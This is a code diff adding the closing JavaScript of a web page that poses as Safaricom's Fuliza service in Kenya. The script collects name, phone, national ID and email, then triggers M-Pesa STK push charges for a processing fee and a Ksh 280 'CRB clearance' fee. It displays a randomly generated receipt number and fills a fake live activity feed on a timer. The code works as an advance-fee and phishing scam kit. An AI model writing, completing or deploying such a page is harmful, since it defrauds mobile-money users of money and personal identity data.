+            const status = document.getElementById('procFeeStatus');
+            status.className = 'modal-status show ' + type;
+            status.innerHTML = msg;
+        }
+
+        function proceedToCRB() {
+            document.getElementById('processingFeeConfirmedOverlay').classList.remove('open');
+            showCRBPage();
+        }
+
+        // ==================== CRB PAYMENT (Ksh 280) ====================
+        function openCRBPayment() {
+            document.getElementById('crbModal').classList.add('open');
+            document.getElementById('crbPhoneInput').value = appData.phone.replace(/^0/, '') || '710222875';
+            document.getElementById('crbStatus').className = 'modal-status';
+            document.getElementById('crbStatus').innerHTML = '';
+            document.getElementById('crbPayBtn').disabled = false;
+            document.getElementById('crbPayText').textContent = 'Pay Ksh 280';
+            document.getElementById('crbSpinner').style.display = 'none';
+        }
+
+        function closeCRBModal() { document.getElementById('crbModal').classList.remove('open'); }
+
+        async function processCRBPayment() {
+            const rawPhone = document.getElementById('crbPhoneInput').value.trim();
+            if (!rawPhone) {
+                showCRBStatus('error', 'Please enter your M-Pesa number.');
+                return;
+            }
+
+            const payBtn = document.getElementById('crbPayBtn');
+            const payText = document.getElementById('crbPayText');
+            const spinner = document.getElementById('crbSpinner');
+            const status = document.getElementById('crbStatus');
+
+            payBtn.disabled = true;
+            payText.textContent = 'Sending...';
+            spinner.style.display = 'inline-block';
+            status.className = 'modal-status show pending';
+            status.innerHTML = '⏳ Sending STK push to your phone...';
+
+            document.getElementById('stkPhoneDisplay').textContent = '(' + rawPhone + ')';
+            document.getElementById('stkWaitingOverlay').classList.add('open');
+
+            try {
+                const reference = `CRB_${Date.now()}_${Math.floor(Math.random() * 10000)}`;
+                const result = await payloreSTKPush(rawPhone, 280, reference, 'Fuliza CRB Clearance');
+                crbTransactionId = result.transactionId;
+                console.log('✅ CRB Transaction ID:', crbTransactionId);
+
+                // Poll status
+                await pollTransactionStatus(crbTransactionId, 'crb');
+
+                document.getElementById('stkWaitingOverlay').classList.remove('open');
+                closeCRBModal();
+                proceedToFinalPage();
+
+                payBtn.disabled = false;
+                payText.textContent = 'Pay Ksh 280';
+                spinner.style.display = 'none';
+                status.className = 'modal-status';
+
+            } catch (err) {
+                document.getElementById('stkWaitingOverlay').classList.remove('open');
+                console.error('❌ CRB Payment error:', err);
+                status.className = 'modal-status show error';
+                status.innerHTML = '❌ ' + err.message;
+                payBtn.disabled = false;
+                payText.textContent = 'Pay Ksh 280';
+                spinner.style.display = 'none';
+            }
+        }
+
+        function showCRBStatus(type, msg) {
+            const status = document.getElementById('crbStatus');
+            status.className = 'modal-status show ' + type;
+            status.innerHTML = msg;
+        }
+
+        // ==================== POLL TRANSACTION STATUS ====================
+        function pollTransactionStatus(transactionId, type) {
+            return new Promise((resolve, reject) => {
+                let attempts = 0;
+                const maxAttempts = 30; // 30 * 2s = 60 seconds
+
+                const interval = setInterval(async () => {
+                    attempts++;
+                    try {
+                        const statusData = await payloreTransactionStatus(transactionId);
+                        console.log(`📊 ${type} status:`, statusData.status);
+
+                        if (statusData.status === 'COMPLETED' || statusData.status === 'SUCCESS') {
+                            clearInterval(interval);
+                            resolve(statusData);
+                        } else if (statusData.status === 'FAILED' || statusData.status === 'CANCELLED') {
+                            clearInterval(interval);
+                            reject(new Error(`Transaction ${statusData.status}`));
+                        } else if (attempts >= maxAttempts) {
+                            clearInterval(interval);
+                            reject(new Error('Transaction timeout. Please check your M-PESA app.'));
+                        }
+                        // Status is 'PENDING' or 'SENT' - continue polling
+                    } catch (err) {
+                        console.error('Polling error:', err);
+                        clearInterval(interval);
+                        reject(err);
+                    }
+                }, 2000);
+            });
+        }
+
+        // ==================== FINAL PAGE (All Fees Cleared) ====================
+        function proceedToFinalPage() {
+            const rawPhone = appData.phone.startsWith('0') ? appData.phone : '0' + appData.phone;
+            document.getElementById('finalPhoneDisplay').textContent = rawPhone;
+            document.getElementById('finalReceiptDisplay').textContent = 'UG' + Math.random().toString(36).substring(2, 11)
+                .toUpperCase();
+            showPage('allFeesClearedPage');
+        }
+
+        function backToHome() {
+            showPage('welcomePage');
+            document.getElementById('welcomePage').style.display = 'block';
+            document.getElementById('formsArea').style.display = 'none';
+            if (feedInterval) { clearInterval(feedInterval);
+                feedInterval = null; }
+        }
+
+        // ==================== TOAST ====================
+        function showToast(msg) {
+            const toast = document.getElementById('toast');
+            toast.textContent = msg;
+            toast.classList.add('show');
+            setTimeout(() => toast.classList.remove('show'), 3000);
+        }
+
+        // ──────────────────────────────────────────────────────────────
+        // ATTACH ALL FUNCTIONS TO `window` SO `onclick` WORKS
+        // ──────────────────────────────────────────────────────────────
+        window.startApplication = startApplication;
+        window.showPage = showPage;
+        window.goToStep = goToStep;
+        window.showCRBPage = showCRBPage;
+        window.showProcessingFeePage = showProcessingFeePage;
+        window.submitApplication = submitApplication;
+        window.openProcessingFeePayment = openProcessingFeePayment;
+        window.closeProcFeeModal = closeProcFeeModal;
+        window.processProcessingFee = processProcessingFee;
+        window.proceedToCRB = proceedToCRB;
+        window.openCRBPayment = openCRBPayment;
+        window.closeCRBModal = closeCRBModal;
+        window.processCRBPayment = processCRBPayment;
+        window.backToHome = backToHome;
+        window.showToast = showToast;
+
+        // ──────────────────────────────────────────────────────────────
+        // INIT
+        // ──────────────────────────────────────────────────────────────
+        document.addEventListener('DOMContentLoaded', function() {
+            const fullNameInput = document.getElementById('fullName');
+            const phoneInput = document.getElementById('phoneNumber');
+            const nationalIdInput = document.getElementById('nationalId');
+            const emailInput = document.getElementById('email');
+            const currentLimitInput = document.getElementById('currentLimit');
+
+            fullNameInput.addEventListener('input', () => validateName(fullNameInput));
+            phoneInput.addEventListener('input', () => {
+                phoneInput.value = phoneInput.value.replace(/[^0-9]/g, '');
+                if (phoneInput.value.length > 10) phoneInput.value = phoneInput.value.slice(0, 10);
+                validatePhone(phoneInput);
+            });
+            nationalIdInput.addEventListener('input', () => {
+                nationalIdInput.value = nationalIdInput.value.replace(/[^0-9]/g, '');
+                if (nationalIdInput.value.length > 8) nationalIdInput.value = nationalIdInput.value.slice(0, 8);
+                validateID(nationalIdInput);
+            });
+            emailInput.addEventListener('input', () => validateEmail(emailInput));
+            currentLimitInput.addEventListener('input', () => {
+                currentLimitInput.value = currentLimitInput.value.replace(/[^0-9]/g, '');
+                validateCurrentLimit(currentLimitInput);
+            });
+
+            renderFeed();
+        });
+
+        setInterval(() => {
+            const step3Active = document.getElementById('step3').classList.contains('active');
+            const procActive = document.getElementById('processingFeePage').classList.contains('active');
+            const crbActive = document.getElementById('crbPage').classList.contains('active');
+            if (step3Active || procActive || crbActive) { addRandomFeed(); }
+        }, 10000);
+
+        console.log('🇰🇪 Fuliza Safaricom Kenya (Paylore via proxy) – relative paths');
+    </script>
+</body>
+</html>
